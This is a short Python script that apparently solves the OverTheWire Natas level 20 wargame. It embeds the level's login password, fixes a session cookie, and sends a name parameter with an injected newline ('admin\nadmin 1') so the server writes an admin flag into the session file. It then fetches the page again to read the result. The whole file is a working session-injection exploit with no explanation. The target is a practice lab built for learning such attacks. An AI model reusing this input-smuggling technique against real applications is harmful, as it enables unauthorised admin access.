#!/bin/python

import requests, binascii

url = "http://natas20.natas.labs.overthewire.org"
user = "natas20" 
pwd = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"

s = requests.session()

cookies = {"PHPSESSID" : "dasdwaegew"}
r = s.get(url + "?debug&name=admin\nadmin 1", cookies=cookies, auth=(user,pwd))
print r.content

print "\n===========================\n"

r = s.get(url, cookies=cookies, auth=(user,pwd))
print r.content